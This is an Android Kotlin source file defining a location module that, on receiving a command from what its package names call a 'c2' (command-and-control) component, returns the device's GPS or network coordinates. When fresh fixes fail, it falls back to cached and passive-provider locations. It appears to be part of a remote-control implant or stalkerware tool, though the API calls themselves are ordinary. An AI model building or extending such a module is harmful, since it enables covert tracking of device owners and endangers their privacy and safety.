package org.umbra.core.modules

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationManager
import androidx.core.content.ContextCompat
import com.google.android.gms.location.*
import org.umbra.core.c2.Command
import org.umbra.core.core.UmbraResponse
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeoutOrNull
import kotlin.coroutines.resume

object LocationModule {

    /**
     * Get device location with layered fallbacks:
     * 1. FusedLocationProvider (GPS + network) — 30s timeout
     * 2. getLastKnownLocation from GPS provider (immediate)
     * 3. getLastKnownLocation from NETWORK provider (immediate)
     * 4. getLastKnownLocation from PASSIVE provider (coarse, immediate)
     *
     * Returns partial results with whatever accuracy is available.
     */
    suspend fun get(context: Context, cmd: Command): UmbraResponse {
        val hasFine = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
        val hasCoarse = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION)

        if (hasFine != PackageManager.PERMISSION_GRANTED &&
            hasCoarse != PackageManager.PERMISSION_GRANTED) {
            return UmbraResponse.ErrorResponse(error = "no_location_permission", module = "location")
        }

        // ── 1. Try FusedLocationProvider with 30s timeout ──
        var bestLocation: Location? = null
        var bestProvider = "none"
        var errors = mutableListOf<String>()

        try {
            val client = LocationServices.getFusedLocationProviderClient(context)

            // Try GPS first (high accuracy)
            val fusedLocation = withTimeoutOrNull(30_000L) {
                suspendCancellableCoroutine<Location?> { cont ->
                    client.getCurrentLocation(
                        Priority.PRIORITY_HIGH_ACCURACY, null
                    ).addOnSuccessListener { loc ->
                        cont.resume(loc)
                    }.addOnFailureListener { e ->
                        errors.add("fused_gps:${e.message}")
                        cont.resume(null)
                    }
                }
            }

            if (fusedLocation != null) {
                bestLocation = fusedLocation
                bestProvider = fusedLocation.provider ?: "fused"
            }

            // If GPS timed out or returned nothing, try balanced power (NETWORK provider)
            if (bestLocation == null) {
                val netLocation = withTimeoutOrNull(30_000L) {
                    suspendCancellableCoroutine<Location?> { cont ->
                        client.getCurrentLocation(
                            Priority.PRIORITY_BALANCED_POWER_ACCURACY, null
                        ).addOnSuccessListener { loc ->
                            cont.resume(loc)
                        }.addOnFailureListener { e ->
                            errors.add("fused_network:${e.message}")
                            cont.resume(null)
                        }
                    }
                }
                if (netLocation != null) {
                    bestLocation = netLocation
                    bestProvider = netLocation.provider ?: "fused_balanced"
                }
            }
        } catch (e: Exception) {
            errors.add("fused:${e.message}")
        }

        // ── 2. getLastKnownLocation from GPS provider (immediate) ──
        if (bestLocation == null && hasFine == PackageManager.PERMISSION_GRANTED) {
            try {
                val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                val gpsLast = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                if (gpsLast != null && isRecentEnough(gpsLast, 300_000L)) {  // within 5 min
                    bestLocation = gpsLast
                    bestProvider = "gps_last"
                }
            } catch (e: Exception) {
                errors.add("gps_last:${e.message}")
            }
        }

        // ── 3. getLastKnownLocation from NETWORK provider (immediate) ──
        if (bestLocation == null) {
            try {
                val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                val netLast = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                if (netLast != null && isRecentEnough(netLast, 600_000L)) {  // within 10 min
                    bestLocation = netLast
                    bestProvider = "network_last"
                }
            } catch (e: Exception) {
                errors.add("network_last:${e.message}")
            }
        }

        // ── 4. getLastKnownLocation from PASSIVE provider (coarse, any app's location) ──
        if (bestLocation == null) {
            try {
                val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                val passiveLast = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)
                if (passiveLast != null) {
                    bestLocation = passiveLast
                    bestProvider = "passive_last"
                }
            } catch (e: Exception) {
                errors.add("passive_last:${e.message}")
            }
        }

        if (bestLocation != null) {
            return UmbraResponse.LocationResponse(
                lat = bestLocation.latitude,
                lng = bestLocation.longitude,
                accuracy = bestLocation.accuracy,
                provider = bestProvider
            )
        } else {
            val detail = if (errors.isNotEmpty()) errors.joinToString("; ") else "all providers exhausted"
            return UmbraResponse.ErrorResponse(error = "location_timeout:$detail", module = "location")
        }
    }

    /**
     * Check if a cached location is recent enough to be useful.
     * @param maxAgeMs maximum age in milliseconds
     */
    private fun isRecentEnough(location: Location, maxAgeMs: Long): Boolean {
        val ageMs = System.currentTimeMillis() - location.time
        return ageMs < maxAgeMs
    }
}
